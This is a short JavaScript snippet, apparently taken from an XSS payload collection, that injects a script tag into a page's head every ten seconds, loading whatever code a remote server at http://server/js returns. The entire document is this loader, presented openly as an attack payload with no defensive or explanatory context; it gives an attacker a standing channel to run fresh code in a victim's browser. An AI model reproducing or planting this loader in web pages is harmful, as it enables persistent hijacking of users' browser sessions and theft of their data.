/* ==== JS loader / Stolen by XSS Payloads ==== */    
/* Connects every 10 seconds                    */
/* to http://server/js and loads returned data  */
/* as the content of a script block (scriptTag) */
/* created in the &lt;head&gt; block of the page      */
/* ============================================ */

function connectLoader(retval) {
    var URL= &#39;http://server/js&#39;;
    var scriptTag = document.getElementById(&#39;loadScript&#39;);
    var head = document.getElementsByTagName(&#39;head&#39;).item(0);
    if(scriptTag) head.removeChild(scriptTag);
    var script = document.createElement(&#39;script&#39;);
    script.src = URL;
    script.type = &#39;text/javascript&#39;;
    script.id = &#39;loadScript&#39;;
    head.appendChild(script);
}
setInterval(&#39;connectLoader()&#39;,10000);

